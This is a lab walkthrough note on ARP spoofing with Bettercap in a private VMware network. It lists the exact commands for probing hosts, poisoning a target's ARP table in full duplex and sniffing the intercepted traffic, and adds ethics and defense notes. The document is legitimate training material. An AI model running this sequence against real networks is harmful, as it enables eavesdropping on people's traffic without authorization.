# 🔧 ARP Spoofing with Bettercap: Lab Walkthrough

> **Purpose**: Learn how to perform ARP spoofing using Bettercap in a controlled, ethical lab environment.

---

## 🧠 Objective

Simulate a **Man-in-the-Middle (MITM)** attack by poisoning the ARP table of a target machine (`192.168.48.254`) to intercept traffic, using **Bettercap** on Kali Linux.

---

## ⚙️ Environment

- **Attacker**: Kali Linux VM (`192.168.48.128`)
    
- **Target**: Another VM (`192.168.48.254`)
    
- **Network**: VMware internal NAT (192.168.48.0/24)
    

---

## 🛰️ Step-by-Step Execution

### 1. Start Bettercap on the right interface

```bash
sudo bettercap -iface eth0
```

### 2. Discover active devices on the network

```bash
net.probe on
```

> This launches network probing and automatically starts `net.recon`.

**Output:**

- Devices detected:
    
    - Gateway: `192.168.48.2`
        
    - Target: `192.168.48.254`
        

### 3. Show all hosts on the network

```bash
net.show
```

### 4. Set ARP spoofing to full-duplex (spoof both directions)

```bash
set arp.spoof.fullduplex true
```

### 5. Set your target IP

```bash
set arp.spoof.targets 192.168.48.254
```

### 6. Enable ARP spoofing

```bash
arp.spoof on
```

✅ **Result**: ARP spoofing begins, and Bettercap acts as the MITM between the gateway and the target.

⚠️ **Warning received**:

```
[sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
```

> This means modern routers with ARP spoofing protection may detect and block the attack.

---

## 🕵️ Observing the Traffic

To actually capture and analyze the data:

- Use `net.sniff` in Bettercap:
    
    ```bash
    net.sniff on
    ```
    
- OR inspect traffic with `Wireshark` on the same interface.
    

---

## ⚠️ Legal & Ethical Notes

- This was done in a **virtual lab**, **not a real-world network**.
    
- Never perform ARP spoofing on unauthorized or production networks.
    
- Use this knowledge to build **defenses** like:
    
    - Static ARP entries
        
    - ARP spoofing detection (e.g., `arpwatch`)
        
    - Switching to encrypted protocols (HTTPS, SSH)
        

---

## 📌 Summary for Report or Notebook

|Component|Detail|
|---|---|
|**Tool**|Bettercap|
|**Attack Type**|ARP Spoofing (MITM)|
|**Target IP**|192.168.48.254|
|**Commands Used**|`net.probe on`, `arp.spoof on`, `set arp.spoof.targets`|
|**Result**|Successfully spoofed ARP; traffic can be intercepted|
|**Ethics**|Done in lab only; unauthorized use is illegal|

---
## 🏷️ Tags

#Cyber_Security #Kali_Linux #Wifi_Hacking #Bettercap 

[[Bettercap]] 